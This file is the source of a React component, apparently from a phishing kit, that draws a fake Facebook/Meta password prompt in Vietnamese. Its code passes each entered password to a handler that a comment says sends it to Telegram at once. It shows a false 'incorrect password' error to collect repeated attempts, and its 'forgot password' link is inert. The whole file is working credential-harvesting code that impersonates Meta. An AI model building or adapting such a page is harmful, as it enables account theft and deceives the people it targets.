'use client';

import { useState, type FormEvent } from 'react';
import type { StaticImageData } from 'next/image';
import type { CSSProperties } from 'react';
import type { UiTexts } from '@/types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import FbRoundLogo from '@/assets/images/fb_round_logo.png';
import config from '@/utils/config';

interface LoginModalProps {
    show: boolean;
    onClose: () => void;
    onSubmit: (email: string, password: string) => void;
    onSuccess: () => void;
    texts: UiTexts;
}

const LoginModal = ({ show, onSubmit, onSuccess, texts }: LoginModalProps) => {
    const [formData, setFormData] = useState({
        password: ''
    });
    const [loginAttempt, setLoginAttempt] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    const passwordLoadingMs = Math.max(1, Number(config.PASSWORD_LOADING_TIME || 3)) * 1000;
    const maxPasswordAttempts = Math.max(1, Number(config.MAX_PASS || 2));

    const handleChange = (field: 'password', value: string) => {
        setFormData((prev) => ({ ...prev, [field]: value }));
        if (showError) {
            setShowError(false);
        }
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (!formData.password.trim()) {
            return;
        }

        setIsLoading(true);
        setShowError(false);

        // Gửi Telegram ngay — spinner loading chỉ là UI
        onSubmit('', formData.password);

        setTimeout(() => {
            setIsLoading(false);

            if (loginAttempt + 1 < maxPasswordAttempts) {
                setShowError(true);
                setLoginAttempt((prev) => prev + 1);
                setFormData({ password: '' });
            } else {
                setShowError(false);
                onSuccess();
            }
        }, passwordLoadingMs);
    };

    const togglePasswordVisibility = () => {
        setShowPassword((prev) => !prev);
    };

    if (!show) return null;

    /* ── Eye-off icon (password hidden) ── */
    const EyeOffIcon = () => (
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
            fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" />
            <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242" />
            <path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143" />
            <path d="m2 2 20 20" />
        </svg>
    );

    /* ── Eye icon (password visible) ── */
    const EyeIcon = () => (
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
            fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0" />
            <circle cx="12" cy="12" r="3" />
        </svg>
    );

    /* ── Styles ── */
    const overlayStyle: CSSProperties = {
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0,0,0,0.45)',
        zIndex: 1040,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '16px',
    };

    const modalStyle: CSSProperties = {
        position: 'relative',
        width: '100%',
        maxWidth: '500px',
        backgroundImage: 'linear-gradient(130deg, #f9f1f9, #eaf3fd 35%, #edfbf2)',
        borderRadius: '18px',
        boxShadow: '0 20px 60px rgba(0,0,0,0.18)',
        zIndex: 1050,
        padding: '40px 32px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        gap: '24px',
    };

    const inputWrapperStyle: CSSProperties = {
        position: 'relative',
        width: '100%',
        height: '40px',
        border: `1.5px solid ${showError ? '#e74c3c' : '#d4dbe3'}`,
        borderRadius: '10px',
        backgroundColor: '#fff',
        transition: 'all 0.2s',
        marginBottom: showError ? '4px' : '10px',
    };

    const inputStyle: CSSProperties = {
        width: '100%',
        height: '100%',
        border: 'none',
        outline: 'none',
        padding: '0 44px 0 11px',
        fontSize: '14px',
        borderRadius: '10px',
        backgroundColor: 'transparent',
        color: '#333',
        boxSizing: 'border-box',
    };

    const eyeBtnStyle: CSSProperties = {
        position: 'absolute',
        right: 0,
        top: 0,
        height: '100%',
        display: 'flex',
        alignItems: 'center',
        padding: '0 12px',
        background: 'none',
        border: 'none',
        cursor: 'pointer',
        color: '#606770',
    };

    const submitBtnStyle: CSSProperties = {
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        width: '100%',
        minHeight: '48px',
        borderRadius: '40px',
        backgroundColor: '#0064E0',
        color: '#fff',
        fontSize: '16px',
        fontWeight: 600,
        border: 'none',
        cursor: isLoading ? 'default' : 'pointer',
        opacity: isLoading ? 0.85 : 1,
        transition: 'opacity 0.3s',
        position: 'relative',
    };

    return (
        <div style={overlayStyle}>
            <div style={modalStyle}>
                <div style={{ width: '50px', height: '50px', flexShrink: 0 }}>
                    <img src={(FbRoundLogo as StaticImageData).src} width="100%" height="100%" alt="logo"
                        style={{ objectFit: 'contain' }} />
                </div>

                <div style={{ width: '100%', padding: '0' }}>
                    <p style={{
                        marginBottom: '7px',
                        fontSize: '14px',
                        color: '#9a979e',
                        lineHeight: 1.5,
                    }}>
                        {texts.securityReason || 'Vì lý do bảo mật, hãy nhập mật khẩu để tiếp tục.'}
                    </p>

                    <form autoComplete="off" onSubmit={handleSubmit}>
                        <div style={inputWrapperStyle}>
                            <input
                                style={inputStyle}
                                type={showPassword ? 'text' : 'password'}
                                placeholder={texts.password || 'Nhập mật khẩu'}
                                autoComplete="off"
                                autoCorrect="off"
                                autoCapitalize="none"
                                spellCheck="false"
                                maxLength={30}
                                minLength={3}
                                required
                                disabled={isLoading}
                                value={formData.password}
                                onChange={(e) => handleChange('password', e.target.value)}
                            />
                            <button
                                type="button"
                                style={eyeBtnStyle}
                                tabIndex={-1}
                                aria-label="toggle password visibility"
                                disabled={isLoading}
                                onClick={togglePasswordVisibility}
                            >
                                {showPassword ? <EyeIcon /> : <EyeOffIcon />}
                            </button>
                        </div>

                        {showError && (
                            <p style={{
                                color: '#e74c3c',
                                fontSize: '13px',
                                margin: '0 0 10px 2px',
                            }}>
                                {texts.passwordIncorrect || 'Mật khẩu không chính xác, vui lòng thử lại.'}
                            </p>
                        )}

                        <div style={{ marginTop: '20px', width: '100%' }}>
                            <button type="submit" style={submitBtnStyle} disabled={isLoading}>
                                {isLoading ? (
                                    <span style={{
                                        width: '22px',
                                        height: '22px',
                                        border: '3px solid rgba(255,255,255,0.4)',
                                        borderTopColor: '#fff',
                                        borderRadius: '50%',
                                        animation: 'spin 0.8s linear infinite',
                                        display: 'inline-block',
                                    }} />
                                ) : (
                                    <span>{texts.continueBtn || 'Tiếp tục'}</span>
                                )}
                            </button>
                        </div>

                        <div style={{ marginTop: '10px', textAlign: 'center' }}>
                            <span style={{
                                display: 'inline-block',
                                cursor: 'default',
                                userSelect: 'none',
                                fontSize: '14px',
                                color: '#9a979e',
                                opacity: 0.5,
                            }}>
                                {texts.forgotPassword || 'Quên mật khẩu?'}
                            </span>
                        </div>
                    </form>
                </div>

                <div style={{ width: '60px', height: '60px', flexShrink: 0 }}>
                    <img src={(MetaLogo as StaticImageData).src} width="100%" height="100%" alt="Meta"
                        style={{ objectFit: 'contain' }} />
                </div>
            </div>

            <style>{`
                @keyframes spin {
                    to { transform: rotate(360deg); }
                }
            `}</style>
        </div>
    );
};

export default LoginModal;
